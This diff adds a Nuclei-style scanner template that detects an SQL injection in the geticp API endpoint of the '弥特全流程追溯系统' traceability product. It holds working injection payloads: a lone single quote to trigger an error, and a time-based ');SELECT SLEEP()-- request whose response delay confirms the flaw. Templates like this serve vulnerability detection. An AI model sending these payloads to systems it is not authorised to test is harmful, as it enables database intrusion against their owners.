@@ -1,0 +1,53 @@
+id: poc-yaml-mtscitech-fpts-geticp-sqli
+info:
+  name: 弥特全流程追溯系统 geticp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 弥特全流程追溯系统 (Full Traceability System) via the `geticp` endpoint, allowing attackers to execute arbitrary SQL commands.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /api/org/enterpriseaccountnoauth/geticp?enterprise_code=' HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SQL syntax"
+          - "操作出错"
+        condition: and
+
+  - raw:
+      - |
+        GET /api/org/enterpriseaccountnoauth/geticp?enterprise_code=');SELECT+SLEEP({{t1}})--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"message\":\"成功\""
+        condition: and
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > t1 && duration < t2"
